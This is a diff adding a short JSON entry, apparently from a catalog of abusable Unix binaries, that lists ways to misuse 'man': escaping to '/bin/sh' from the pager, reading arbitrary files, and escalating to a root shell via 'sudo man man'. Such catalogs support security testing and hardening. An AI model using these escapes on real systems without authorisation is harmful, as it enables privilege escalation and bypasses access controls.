@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "man man\n!/bin/sh\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "man [file]"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo man man\n!/bin/sh\n"
+      }
+    ]
+  }
+}
